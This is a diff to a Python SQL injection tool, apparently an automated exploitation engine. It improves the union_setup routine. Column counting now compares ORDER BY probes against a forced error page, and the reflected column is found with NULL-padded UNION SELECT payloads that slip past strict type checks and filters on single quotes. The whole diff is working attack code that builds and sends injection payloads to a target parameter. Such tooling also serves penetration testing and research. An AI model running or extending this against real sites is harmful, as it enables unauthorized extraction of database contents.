@@ -585,29 +585,44 @@ def _uagg(dbms, expr):
     return f"string_agg(cast({expr} as varchar(4000)),{sep})"   # postgres / mssql
 
 
-def union_setup(http, oracle, dbms):
+def union_setup(http, oracle, dbms, maxcols=15):
     """Find the column count (ORDER BY) and a reflected column, or None.
 
-    Markers go in as quote-free literals (see `_strlit`), so a target that filters
-    single quotes still reflects them — without that, every UNION probe on such a
-    target comes back empty and the engine wrongly concludes there's no UNION."""
+    Column count is decided by *relative* similarity, not a fixed cutoff: an
+    out-of-range `ORDER BY n` lands on the DBMS's error page, which on some apps is
+    only a few percent different from a normal page (a single leaked line) — under
+    a 0.95 floor it reads as "valid", so the count overshoots and every UNION probe
+    then fails the column-count match. We compare each `ORDER BY n` against a
+    deliberately-broken `ORDER BY 9999` (a guaranteed error) as well as the base
+    page, and accept n only while it sits closer to the base than to that error.
+
+    The reflected column is then found the textbook way: a single string marker in
+    one position with NULL in the rest, trying each position. NULL is type-
+    compatible with any column, so this survives strict UNION type-checking
+    (Postgres/MSSQL) — putting a string in every column would error there. Markers
+    go in as quote-free literals (see `_strlit`), so a target that filters single
+    quotes still reflects them."""
     q = _quote_for(oracle.context)
     base = _inject(http, oracle.url, oracle.param, oracle.value)
+    err = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY 9999{_COMMENT}")
     ncols = 0
-    for n in range(1, 16):
+    for n in range(1, maxcols + 1):
         r = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY {n}{_COMMENT}")
-        if _sim(r, base) >= 0.95:
+        if _sim(r, base) >= _sim(r, err):
             ncols = n
         else:
             break
     if not ncols:
         return None
-    marks = [f"{_UMARK}{i}z" for i in range(ncols)]
-    sel = ",".join(_strlit(dbms, m) for m in marks)
-    r = _html.unescape(_inject(http, oracle.url, oracle.param,
-                               f"{oracle.value}{q} AND 1=2 UNION SELECT {sel}{_COMMENT}"))
-    refcol = next((i for i, m in enumerate(marks) if m in r), None)
-    return (ncols, refcol) if refcol is not None else None
+    for refcol in range(ncols):
+        mark = f"{_UMARK}{refcol}z"
+        cols = ["NULL"] * ncols
+        cols[refcol] = _strlit(dbms, mark)
+        r = _html.unescape(_inject(http, oracle.url, oracle.param,
+                                   f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"))
+        if mark in r:
+            return ncols, refcol
+    return None
 
 
 def union_value(http, oracle, dbms, ncols, refcol, expr):
